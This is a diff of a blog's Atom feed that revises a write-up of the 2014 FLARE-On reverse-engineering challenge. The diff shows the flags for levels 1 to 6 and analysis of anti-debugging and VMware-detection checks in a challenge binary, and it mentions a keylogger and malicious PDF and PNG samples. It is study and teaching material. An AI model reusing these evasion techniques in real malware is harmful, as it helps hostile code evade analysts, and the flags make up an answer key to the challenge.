@@ -4,7 +4,7 @@
   <title><![CDATA[Parsiya's Den]]></title>
   <link href="http://parsiya.net/atom.xml" rel="self"/>
   <link href="http://parsiya.net/"/>
-  <updated>2014-10-05T03:33:07-04:00</updated>
+  <updated>2014-10-05T20:31:07-04:00</updated>
   <id>http://parsiya.net/</id>
   <author>
     <name><![CDATA[Parsiya]]></name>
@@ -18,7 +18,7 @@
     <link href="http://parsiya.net/blog/2014-09-23-my-adventure-with-fireeye-flare-challenge/"/>
     <updated>2014-09-23T23:13:44-04:00</updated>
     <id>http://parsiya.net/blog/my-adventure-with-fireeye-flare-challenge</id>
-    <content type="html"><![CDATA[<p>These are my solutions to Fireeye’s FLARE challenge. This is just not the solution but other ways that I tried. This was a great learning experience for me so I am writing this to document everything I tried. As a result, this post is somewhat long.</p>
+    <content type="html"><![CDATA[<p>These are my solutions to Fireeye’s FLARE challenge. This is just not the solution but other ways that I tried. This was a great learning experience for me so I am writing this post to document everything I tried. As a result, this post is somewhat long.</p>
 
 <p>If you have any feedback, please let me know. I spent a lot of time on this writeup and I am always happy to learn new stuff. My email and twitter handle are in the sidebar.</p>
 
@@ -186,9 +186,8 @@ Line #4 reads <code>dat_secret</code> and the rest of the function manipulates i
 </span><span class="line"><span class="k">print</span> <span class="n">str1</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<p>Flag:</p>
-
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 1 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 </pre></td><td class="code"><pre><code class=""><span class="line">3rmahg3rd.b0b.d0ge@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <hr />
@@ -204,18 +203,17 @@ Line #4 reads <code>dat_secret</code> and the rest of the function manipulates i
 </span><span class="line">Hopefully you'll knock this one out too, Good luck!
 </span><span class="line">
 </span><span class="line">-FLARE</span></code></pre></td></tr></table></div></figure></notextile></div>
-<p>Inside the archive we have the following files:</p>
-
-<p>This seems to be a copy of the original <a href="https://flare-on.com">https://flare-on.com</a> with a launch date countdown timer. I will be calling the html page from the website <code>original_html</code> and the other one <code>challenge_html</code>.</p>
+<p>Inside the archive seems to be a copy of the original <a href="http://flare-on.com">http://flare-on.com</a> with a launch date countdown timer. I will be calling the html page from the website <code>original_html</code> and the other one <code>challenge_html</code>.</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
 <span class="line-number">3</span>
 <span class="line-number">4</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">-rwx------+ 1 TyRaX None 8378 home.html
+</pre></td><td class="code"><pre><code class="powershell"><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">8378</span> <span class="n">home</span><span class="p">.</span><span class="n">html</span>
 </span><span class="line">
-</span><span class="line">directory called "img" with one single png
-</span><span class="line">-rwx------+ 1 TyRaX None 9560 flare-on.png</span></code></pre></td></tr></table></div></figure></notextile></div>
+</span><span class="line"><span class="n">directory</span> <span class="n">called</span> <span class="s2">&quot;img&quot;</span> <span class="n">with</span> <span class="n">one</span> <span class="n">single</span> <span class="n">png</span>
+</span><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">9560</span> <span class="n">flare-on</span><span class="p">.</span><span class="n">png</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p><img src="http://parsiya.net/images/2014/flare/2-1.jpg" alt="challenge_html" title="challenge_html" /></p>
 
@@ -226,11 +224,12 @@ Line #4 reads <code>dat_secret</code> and the rest of the function manipulates i
 <span class="line-number">3</span>
 <span class="line-number">4</span>
 <span class="line-number">5</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">-rwx------+ 1 TyRaX None 6254 The FLARE On Challenge.htm
+</pre></td><td class="code"><pre><code class="powershell"><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">6254</span> <span class="n">The</span> <span class="n">FLARE</span> <span class="n">On</span> <span class="n">Challenge</span><span class="p">.</span><span class="n">htm</span>
 </span><span class="line">
-</span><span class="line">and
-</span><span class="line">-rwx------+ 1 TyRaX None 116290 bootstrap.css
-</span><span class="line">-rwx------+ 1 TyRaX None   6596 flare-on-V2.png</span></code></pre></td></tr></table></div></figure></notextile></div>
+</span><span class="line"><span class="n">and</span>
+</span><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span> <span class="n">116290</span> <span class="n">bootstrap</span><span class="p">.</span><span class="n">css</span>
+</span><span class="line"><span class="n">-rwx</span><span class="p">------+</span> <span class="n">1</span> <span class="n">TyRaX</span> <span class="n">None</span>   <span class="n">6596</span> <span class="n">flare-on-V2</span><span class="p">.</span><span class="n">png</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p><img src="http://parsiya.net/images/2014/flare/2-2.jpg" alt="original_html" title="original_html" /></p>
 
@@ -255,7 +254,7 @@ Most differences are aesthetic. There are two interesting differences. In line 5
 </pre></td><td class="code"><pre><code class=""><span class="line">-rwx------+ 1 TyRaX None 9560 Jul  7 21:30 flare-on.png
 </span><span class="line">-rwx------+ 1 TyRaX None 6596 Dec 18  2013 flare-on-V2.png</span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<p>The challenge png is bigger. I used <code>HxD</code> to compare these two files (as they are not text) and sure at the end of <code>flare-on.png</code> I saw some PHP code. To be honest I was thinking of steganography or some <a href="https://twitter.com/angealbertini">Ange Albertini like magic</a>. But I think that would have been too hard for level 2. Here is the PHP code (beautified):</p>
+<p>The challenge png is bigger. I used <code>HxD</code> to compare these two files (as they are not text) and sure at the end of <code>flare-on.png</code> I saw some PHP code. To be honest I was thinking of steganography or some <a href="https://twitter.com/angealbertini">Ange Albertini magic</a>. But I think that would have been too hard for level 2. Here is the PHP code (beautified):</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -358,7 +357,8 @@ Line #4 can be re-written as </p>
 
 <p>Fortunately, we are done.</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 2 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
 <span class="line-number">3</span>
 </pre></td><td class="code"><pre><code class=""><span class="line">a11DOTthatDOTjava5crapATflareDASHonDOTcom
@@ -386,7 +386,8 @@ Line #4 can be re-written as </p>
 
 <p><img src="http://parsiya.net/images/2014/flare/3-2.jpg" alt="Flag in memory" title="Flag in memory" /></p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 3 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 </pre></td><td class="code"><pre><code class=""><span class="line">such.5h311010101@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <hr />
@@ -608,15 +609,11 @@ Let’s follow the tutorial:</p>
 <span class="line-number">69</span>
 <span class="line-number">70</span>
 <span class="line-number">71</span>
-<span class="line-number">72</span>
-<span class="line-number">73</span>
 </pre></td><td class="code"><pre><code class="js"><span class="line"><span class="p">[</span><span class="mh">0x00000000</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">pdfvi</span>
 </span><span class="line"><span class="nx">Applying</span> <span class="nx">Filter</span> <span class="nx">FlateDecode</span> <span class="p">...</span>
 </span><span class="line"><span class="nx">Applying</span> <span class="nx">Filter</span> <span class="nx">ASCIIHexDecode</span> <span class="p">...</span>
 </span><span class="line"><span class="nx">Encoded</span> <span class="nx">Stream</span> <span class="mi">1</span>
 </span><span class="line"><span class="o">--------------------------------------------------------------------------------</span>
-</span><span class="line">
-</span><span class="line">
 </span><span class="line">    <span class="kd">var</span> <span class="nx">HdPN</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
 </span><span class="line">    <span class="kd">var</span> <span class="nx">zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
 </span><span class="line">
@@ -808,7 +805,8 @@ Let’s follow the tutorial:</p>
 
 <p>Bingo. The key is <code>BEEF</code>. It is also in the initial shellcode as a string. Let’s xor it with the complete string and get the flag.</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 4 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 </pre></td><td class="code"><pre><code class=""><span class="line">wa1ch.d3m.spl01ts@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <hr />
@@ -1368,7 +1366,8 @@ If key was not pressed, we jump to line 26 and then 29 where var</em>4 is increa
 
 <p>So we have <code>m</code> and then <code>o</code>. If we follow the chain and then reverse it, we have the flag. The binary is a keylogger, it saves all keystrokes in <code>svchost.log</code>.</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 5 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 </pre></td><td class="code"><pre><code class=""><span class="line">l0gging.Ur.5tr0ke5@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <hr />
@@ -1848,7 +1847,6 @@ We have already seen the transitive property of xor so we can calculate the corr
 <span class="line-number">16</span>
 <span class="line-number">17</span>
 <span class="line-number">18</span>
-<span class="line-number">19</span>
 </pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC39C</span>  <span class="c1">; ---------------------------------------------------------------------------</span>
 </span><span class="line">
 </span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC39C</span>  <span class="nv">loc_7FFF3A5AC39C</span><span class="p">:</span>
@@ -1866,7 +1864,6 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3B3</span>  <span class="nv">cmp</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">],</span> <span class="mh">30h</span>
 </span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3B6</span>  <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc_7FFF3A5AC3BA</span>
 </span><span class="line"><span class="err">[</span><span class="nf">stack</span><span class="p">]:</span><span class="mi">00007</span><span class="nv">FFF3A5AC3B8</span>  <span class="nv">jmp</span>     <span class="nb">rbx</span>
-</span><span class="line">
 </span><span class="line"><span class="nf">...</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
@@ -2019,7 +2016,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 
 <p>Thanks <a href="https://twitter.com/Wartortell">@Wartortell</a>.</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag </span></figcaption>
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 6 </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 </pre></td><td class="code"><pre><code class=""><span class="line">l1nhax.hurt.u5.a1l@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>
 
@@ -2087,15 +2084,9 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">199.16.156.198	10.0.2.15	TLSv1	1431	Application Data
 </span><span class="line">199.16.156.198	10.0.2.15	TLSv1	1474	Application Data</span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<p>Query for <code>www.dogecoin.com</code>, <code>e.root-servers.net</code> and <code>www.twitter.com</code>. Then TLS handshake in lines 7-11 and finally a request to twitter (line 12) and reply (lines 13-14). Let’s search for “twitter” in API Monitor and we see this <code>InternetOpenUrlW ( 0x00cc0004, "https://twitter.com/FireEye/status/484033515538116608", NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_PRAGMA_NOCACHE, 0 )</code>. It’s a normal tweet about an</p>
+<p>Query for <code>www.dogecoin.com</code>, <code>e.root-servers.net</code> and <code>www.twitter.com</code>. Then TLS handshake in lines 7-11 and finally a request to twitter (line 12) and reply (lines 13-14). Let’s search for “twitter” in API Monitor and we see this <code>InternetOpenUrlW ( 0x00cc0004, "https://twitter.com/FireEye/status/484033515538116608", NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_PRAGMA_NOCACHE, 0 )</code>. It’s a normal tweet:</p>
 
 <p><img src="http://parsiya.net/images/2014/flare/7-2.jpg" alt="When embed tweet plugins for Octopress don't work" title="When embed tweet plugins for Octopress don't work" /></p>
-
-<p>Looks like a normal tweet.</p>
-
-<p>I started with IDA. Eventually I reached this place where I saw tons of function calls.</p>
-
-<p><img src="http://parsiya.net/images/2014/flare/7-3.jpg" alt="Bad attempt at maymays" title="Bad attempt at maymays" /></p>
 
 <p>Because this challenge employ a good number of Anti-Debug/Anti-VM protections (I think that’s what it is trying to teach). I will try to explain what I learned at each stage. Even after finishing the challenge I went back and looked at some steps again to learn more.</p>
 
@@ -2113,7 +2104,80 @@ We have already seen the transitive property of xor so we can calculate the corr
   </li>
 </ul>
 
-<h4 id="function-1---beingdebugged">Function 1 - BeingDebugged?</h4>
+<p>Find <code>main</code> and put a breakpoint on it. As we go through main we reach a bunch of function calls. Let’s start with the first one.</p>
+
+<h4 id="function-1---isdebuggerpresent">Function 1 - isDebuggerPresent?</h4>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">sub_401030</span>   <span class="c1">; you are here</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">sub_4010C0</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">sub_401130</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub_4011D0</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub_4012A0</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub_401350</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub_4013F0</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub_401460</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p><img src="http://parsiya.net/images/2014/flare/7-3.jpg" alt="isDebuggerPresent" title="isDebuggerPresent" /></p>
+
+<p>The result of a function call <code>isDebuggerPresent</code> is compared with 0 by <code>test eax, eax</code>. This function will return 1 if the application is being debugged. In our case it will return 1 and the jump fails. Before the compare we see a value <code>0x106240</code><code> or </code><code>1073728</code><code> is loaded into </code><code>esi</code><code>. On both sides we see a string being loaded and then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing </code><code>oh happy dayz</code><code> with the data at </code><code>byte_4131F8</code><code>. If we reach the end of the string it will restart from the first character. This loop will go on for </code><code>1073728</code><code> bytes which seems to be length of data starting at </code><code>byte_4131F8</code><code>. I am going to rename it to </code><code>blob</code><code> and the number </code><code>0x106240</code><code> to </code><code>blob_length</code>`.</p>
+
+<p>If debugger is present, we go left and the string <code>oh happy dayz</code> is xor-ed with the blob. If no debugger is present, we jump to the right branch and string <code>the final countdown</code> is xor-ed with the <code>blob</code>.</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>isDebuggerPresent </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="k">if</span> <span class="p">(</span><span class="n">isDebuggerPresent</span><span class="p">):</span>
+</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;oh happy dayz&quot;</span><span class="p">)</span>
+</span><span class="line"><span class="k">else</span><span class="p">:</span>
+</span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;the final countdown&quot;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<h4 id="function-2---beingdebugged">Function 2 - BeingDebugged?</h4>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">sub_4010C0</span>    <span class="c1">; you are here</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">sub_401130</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub_4011D0</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub_4012A0</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub_401350</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub_4013F0</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub_401460</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub_4014F0</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub_401590</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>Let’s forget about the first compare and look at the outcome. Something is being compared with 1. If the compare succeeds then the first jump happens and we skip reseting <code>var_4</code> to zero. The next jump will only happen if <code>var_4</code> is zero which means that the last jump should not have happened. If the first compare succeeds (meaning <code>[eax+2]</code> is 1) then we go left and otherwise right.</p>
 
@@ -2123,7 +2187,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 
 <p><img src="http://parsiya.net/images/2014/flare/7-5.jpg" alt="blob" title="blob" /></p>
 
-<p>Looking inside <code>sub_401000</code>. At the start <code>0x106240</code> or <code>1073728</code> decimal is loaded into <code>ecx</code>. Then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing <code>UNACCEPTABLE!</code> with the data at <code>byte_4131F8</code>. If we reach the end of the string it will restart from the first character. This loop will go on for <code>1073728</code> bytes which seems to be length of data starting at <code>byte_4131F8</code>. I am going to rename it to <code>blob</code>. So <code>sub_401000</code> is <code>string xor blob</code>.</p>
+<p>Looking inside <code>sub_401000</code>. At the start <code>blob_length</code> is loaded into <code>ecx</code>. Then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing <code>UNACCEPTABLE!</code> with the data at <code>byte_4131F8</code>. If we reach the end of the string it will restart from the first character. This loop will go on for <code>1073728</code> bytes which seems to be length of data starting at <code>byte_4131F8</code>. So <code>sub_401000</code> is <code>string xor blob</code>.</p>
 
 <p><img src="http://parsiya.net/images/2014/flare/7-6.jpg" alt="xor function" title="xor function" /></p>
 
@@ -2183,7 +2247,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;omglob&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h4 id="function-2---vmware-detection-via-red-pill">Function 2 - VMware Detection via Red Pill</h4>
+<h4 id="function-3---vmware-detection-via-red-pill">Function 3 - VMware Detection via Red Pill</h4>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2196,7 +2260,11 @@ We have already seen the transitive property of xor so we can calculate the corr
 <span class="line-number">9</span>
 <span class="line-number">10</span>
 <span class="line-number">11</span>
-</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">calls_isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">sub_401130</span>       <span class="c1">; you are here</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub_4011D0</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub_4012A0</span>
@@ -2272,7 +2340,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;you&#39;re so bad&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h4 id="function-3---wmware-detection-2-electric-boogaloo">Function 3 - WMware Detection 2: Electric Boogaloo</h4>
+<h4 id="function-4---wmware-detection-2-electric-boogaloo">Function 4 - WMware Detection 2: Electric Boogaloo</h4>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2285,7 +2353,9 @@ We have already seen the transitive property of xor so we can calculate the corr
 <span class="line-number">9</span>
 <span class="line-number">10</span>
 <span class="line-number">11</span>
-</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
+<span class="line-number">12</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub_4011D0</span>       <span class="c1">; you are here</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub_4012A0</span>
@@ -2336,7 +2406,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="mh">0x66</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h3 id="function-4---outputdebugstring">Function 4 - OutputDebugString</h3>
+<h3 id="function-5---outputdebugstring">Function 5 - OutputDebugString</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2349,7 +2419,9 @@ We have already seen the transitive property of xor so we can calculate the corr
 <span class="line-number">9</span>
 <span class="line-number">10</span>
 <span class="line-number">11</span>
-</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
+<span class="line-number">12</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">VMware_detection</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">Electric_Boogaloo</span>
 </span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub_4012A0</span>       <span class="c1">; you are here</span>
@@ -2377,7 +2449,7 @@ We have already seen the transitive property of xor so we can calculate the corr
 </span><span class="line">    <span class="nf">blob</span> <span class="err">=</span> <span class="nv">xor</span><span class="p">(</span><span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span> <span class="s">&quot;I&#39;m gonna sandbox your face&quot;</span><span class="p">)</span>
 </span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<h3 id="function-5---i-can-haz-breakpoint">Function 5 - I Can Haz Breakpoint?</h3>
+<h3 id="function-6---i-can-haz-breakpoint">Function 6 - I Can Haz Breakpoint?</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
 <span class="line-number">2</span>
@@ -2390,7 +2462,9 @@ We have already seen the transitive property of xor so we can calculate the corr
 <span class="line-number">9</span>
 <span class="line-number">10</span>
 <span class="line-number">11</span>
